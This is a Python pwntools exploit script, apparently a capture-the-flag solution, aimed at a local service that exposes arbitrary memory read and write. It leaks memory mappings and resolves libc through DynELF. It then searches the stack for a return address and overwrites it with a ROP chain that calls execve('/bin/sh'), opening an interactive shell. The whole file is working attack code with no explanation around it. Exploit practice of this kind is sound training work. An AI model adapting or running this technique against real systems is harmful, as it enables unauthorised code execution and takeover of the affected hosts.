#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 31337

OFFSET_MAIN = 0x1511
OFFSET_RET_WRITEANY = 0x15d0
OFFSET_RET_READANY = 0x15c9
OFFSET_START = 0x1d90

OFFSET_POP_RDI = 0x00001863 # 0x00001863: pop rdi ; ret  ;  \x5f\xc3 (1 found)
OFFSET_RET = 0x00001884 # 0x00001884: ret  ;  \xc3 (1 found)

LOCAL = False

context(arch='amd64', os='linux')
elf = ELF('container/service')
io = remote(HOST, PORT, level='debug')
#io = gdb.debug('container/service', level='debug')

def menu(io, cmd):
    io.recvuntil(b'>> ')
    io.sendline(str(cmd).encode())

def mem_read(io, address, length):
    menu(io, 1)
    io.recvuntil(b'Address: ')
    io.sendline(str(address).encode())
    io.recvuntil(b'length: ')
    io.sendline(str(length).encode())
    leak = io.recv(2*length)
    return leak[::2]

def mem_write(io, address, value):
    menu(io, 2)
    io.recvuntil(b'Address: ')
    io.sendline(str(address).encode())
    io.recvuntil(b'overwrite: ')
    io.sendline(str(value).encode())

text_base = None
heap_base = None
stack_base = None

io.recvline_contains(b'Let me give you a hint')
while True:
    line = io.recvline().decode()
    if 'read anything' in line:
        break

    parts = line.strip().split()
    addr_range, permissions = parts[:2]
    start_addr, end_addr = [int(x, 16) for x in addr_range.split('-', 1)]
    if len(parts) > 5:
        mapped_file = ' '.join(parts[5:])
    else:
        mapped_file = ''

    if mapped_file.endswith('/service') and text_base == None:
        text_base = start_addr

    if mapped_file == '[stack]' and stack_base == None:
        stack_base = end_addr

    if mapped_file == '[heap]' and heap_base == None:
        heap_base = start_addr

    #log.debug('Leak: %#x-%#x %s %s', start_addr, end_addr, permissions, mapped_file)

if text_base == None:
    log.error('Failed to find text base')
if stack_base == None:
    log.error('Failed to find stack base')
if heap_base == None:
    log.error('Failed to find heap base')

log.info('Text base: %x', text_base)
log.info('Stack base: %x', stack_base)
log.info('Heap base: %x', heap_base)

elf.address = text_base
addr_main = text_base + OFFSET_MAIN
addr_ret_writeany = text_base + OFFSET_RET_WRITEANY
addr_ret_readany = text_base + OFFSET_RET_READANY

leak_size = 8
@MemLeak
def leak(address):
    data = mem_read(io, address, leak_size)
    log.debug("%#x => %s", address, enhex(data or ''))
    return data

d = DynELF(leak, text_base, elf=elf)
libc_base = d.lookup(None, 'libc')
addr_system = d.lookup('system', 'libc')

log.info('system() addr: %#x', addr_system)
log.info('main() addr: %#x', addr_main)

addr_pop_rdi = text_base + OFFSET_POP_RDI
addr_ret = text_base + OFFSET_RET

if LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_base
else:
    libc = d.libc

addr_start = libc_base + OFFSET_START

#io.interactive()

leak_size = 8
cur_stack = stack_base
with log.progress('Searching stack') as p:
    while True:
        cur_stack -= leak_size
        p.status('addr: %x', cur_stack)
        leaked_data = leak.n(cur_stack, leak_size)
        #log.hexdump(leaked_data)
        if p64(addr_ret_readany) in leaked_data:
            p.success('Found ret addr location: %x', cur_stack)
            break

cur_stack += 64*8

pause()

print(elf, libc)
rop = ROP([elf, libc], base=cur_stack)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)
print(rop.dump())
rop_data = bytes(rop)
#rop_len = len(bytes(rop))

for i in range(0, len(rop_data), 8):
    mem_write(io, cur_stack + i, u64(rop_data[i:i+8]))

for i in range(1, 65):
    mem_write(io, cur_stack - 8*i, addr_ret)

io.interactive()
